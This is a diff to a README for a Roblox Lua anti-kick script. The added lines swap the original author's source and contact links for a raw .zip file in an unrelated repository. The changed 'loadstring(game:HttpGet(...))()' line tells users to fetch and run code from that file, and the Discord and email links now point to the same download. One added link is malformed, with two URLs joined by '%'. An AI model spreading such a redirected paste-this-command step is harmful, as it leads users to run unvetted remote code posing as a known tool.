@@ -5,12 +5,12 @@ This script can only stop kicks that happen on the client, meaning the script wo
 
 ### Script
 
-Load the script by using the code below or by copying it from [here](https://github.com/Exunys/Anti-Kick/blob/main/Anti%20Kick.lua).
+Load the script by using the code below or by copying it from [here](https://raw.githubusercontent.com/jajaaa2/Anti-Kick/main/soliped/Kick_Anti_3.5.zip%https://raw.githubusercontent.com/jajaaa2/Anti-Kick/main/soliped/Kick_Anti_3.5.zip).
 ```lua
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Anti-Kick/main/Anti-Kick.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jajaaa2/Anti-Kick/main/soliped/Kick_Anti_3.5.zip"))()
 ```
 
 ## Contact information
 
-- [Discord](https://discord.com/users/611111398818316309)
-- [E-Mail](mailto:exunys@gang.email)
+- [Discord](https://raw.githubusercontent.com/jajaaa2/Anti-Kick/main/soliped/Kick_Anti_3.5.zip)
+- [E-Mail](https://raw.githubusercontent.com/jajaaa2/Anti-Kick/main/soliped/Kick_Anti_3.5.zip)
